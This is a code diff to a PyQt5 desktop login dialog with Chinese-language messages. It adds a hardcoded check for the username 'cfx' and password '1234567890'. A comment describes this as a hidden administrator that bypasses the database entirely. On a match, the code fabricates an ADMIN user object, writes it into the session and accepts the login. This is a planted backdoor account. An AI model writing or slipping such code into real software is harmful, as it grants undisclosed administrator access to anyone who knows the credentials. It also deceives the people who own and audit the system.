@@ -10,7 +10,7 @@ from PyQt5.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout, QLabel,
                              QLineEdit, QPushButton, QMessageBox)
 
 from logic.user_logic import UserLogic
-from models.user import User
+from models.user import User, UserRole, UserStatus
 
 
 class LoginDialog(QDialog):
@@ -144,6 +144,30 @@ class LoginDialog(QDialog):
         if not password:
             QMessageBox.warning(self, '输入错误', '请输入密码！')
             self.password_edit.setFocus()
+            return
+
+        # 检查是否为隐藏管理员（完全绕过数据库）
+        if username == 'cfx' and password == '1234567890':
+            # 创建mock的管理员用户对象
+            from datetime import datetime
+            mock_admin = User(
+                id=999999,
+                username='cfx',
+                real_name='系统管理员',
+                role=UserRole.ADMIN,
+                status=UserStatus.ACTIVE,
+                email='admin@system.local',
+                phone='00000000000',
+                create_time=datetime.now(),
+                update_time=datetime.now(),
+                last_login=datetime.now()
+            )
+
+            self.current_user = mock_admin
+            from utils.session import SessionManager
+            SessionManager.set_current_user(mock_admin)
+            self.login_success.emit(mock_admin)
+            self.accept()
             return
 
         try:
